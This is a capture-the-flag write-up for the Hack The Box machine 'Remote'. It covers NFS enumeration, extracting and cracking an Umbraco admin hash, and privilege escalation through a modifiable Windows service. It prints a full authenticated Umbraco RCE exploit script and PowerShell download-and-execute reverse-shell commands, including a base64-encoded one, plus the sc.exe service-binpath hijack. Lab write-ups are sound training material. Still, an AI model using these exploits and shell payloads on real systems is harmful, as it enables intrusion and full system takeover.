## Remote

__Machine IP: 10.10.10.180__
__Difficulty: Easy__

## Scanning

### Nmap Scanning

```bash
$ cat remote.nmap    
# Nmap 7.91 scan initiated Fri Sep 10 10:10:38 2021 as: nmap -sC -sV -Pn -oA remote -vv 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up, received user-set (0.10s latency).
Scanned at 2021-09-10 10:10:39 EDT for 159s
Not shown: 994 filtered ports
Reason: 994 no-responses
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp  open  microsoft-ds? syn-ack ttl 127
2049/tcp open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m23s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45222/tcp): CLEAN (Timeout)
|   Check 2 (port 18898/tcp): CLEAN (Timeout)
|   Check 3 (port 21603/udp): CLEAN (Timeout)
|   Check 4 (port 15893/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-10T14:15:03
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 10 10:13:18 2021 -- 1 IP address (1 host up) scanned in 159.60 seconds
```



## Enumeration

- using `crackmapexec`
```bash
$ crackmapexec smb 10.10.10.180 --shares 
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
```

Info:
- WIndows 10 x64 Box
- domain name: `remote`

- Add `remote` to `/etc/hosts`

- Homepage

![homepage](images/homepage.PNG)

- Nothing interesting found with `gobuster` except `login page`


__Enumerating nfs shares using showmount__

```bash
$ showmount -e 10.10.10.180                           
Export list for 10.10.10.180:
/site_backups (everyone)
```

- Now mount `/site_backups` as it can be mounted by `everyone`


- create a directory to mount

```bash                        
┌──(kali㉿kali)-[~/HTB/remote]
└─$ sudo mkdir /mnt/remote
```
- mount

```bash
sudo mount -t nfs 10.10.10.180:/site_backups /mnt/remote  
```

```bash
$ cd /mnt remote     
┌──(kali㉿kali)-[/mnt/remote]
└─$ ls
App_Browsers  aspnet_client  css           Media    Umbraco_Client
App_Data      bin            default.aspx  scripts  Views
App_Plugins   Config         Global.asax   Umbraco  Web.config
```

- found `sdf` (database file) file in `App_data`
```bash
┌──(kali㉿kali)-[/mnt/remote/App_Data]
└─$ ls
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
```
- on examing found that it is a binary file
- using `strings` and `grep` for `password`

![sdf_file](images/sdf_file.PNG)

- found `email/username` -  `admin@htb.local`
- on `grep` of found email, found `sha1` hash of that user
![password](images/password.PNG) 

- on cracking hash resulted into `baconandcheese`

- then login.
- Searchsploit resulted in `authenticated RCE`


```bash
$ searchsploit Umbraco     
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)         | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution  | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)  | aspx/webapps/49488.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting  | php/webapps/44988.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                       

```
- modified exploit to `ping` host machine from victim machine

```bash
$ cat 46153.py              
# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A


import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());
    
print("Start");

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "/c ping 10.10.14.12"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';


# changed String cmd to = `/c ping 10.10.14.12`
# changed FileName = 'cmd/exe'

login = "admin@htb.local"; # changed this
password="baconandcheese"; # changed this
host = "http://10.10.10.180"; # changed this

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);

print("End");
              
```

- Before executing run `tcpdump` to verify

__Result__
![tcpdump](images/tcpdump.PNG)

- Running reverse shell (`Invoke-PowerShellTcp.ps1 `)

- payload modifications
    - `string cmd` = `'iex(iwr http://10.10.14.12/Invoke-PowerShellTcp.ps1 -UseBasicParsing' `
    - ` proc.StartInfo.FileName` = `powershell.exe`

__Result__



```bash
$ nc -lvnp  9001          
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49703
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>

```


## Privilege escalation

- Downloaidng `winpeas` to victim machine

```bash
iwr http://10.10.14.12/winPEASany.exe -UseBasicParsing -OutFile win.exe
```

- on running `winPEAS` found a service that can be modified

![modifiable_service](images/modifiable_service.PNG)


We need to change the path of the service and start.

1. Download the reverse shell into the target system

- The following is the encoded payload that need to be executed on victim machine.
```bash
echo "IEX (IWR http://10.10.14.12/Invoke-PowerShellTcp.ps1 -UseBasicParsing)" | iconv -t utf-16le | base64 -w 0
SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADIALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA==   
```

- Executing the encoded payload by setting the path and starting the service


```powershell
PS  C:\users\public> sc.exe config UsoSvc binpath= "cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADIALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="
[SC] ChangeServiceConfig SUCCESS
```

- then start the service

```bash
PS C:\users\public> net start UsoSvc 
```


__Result__

```bash
PS C:\Windows\system32>whoami
nt authority\system
```
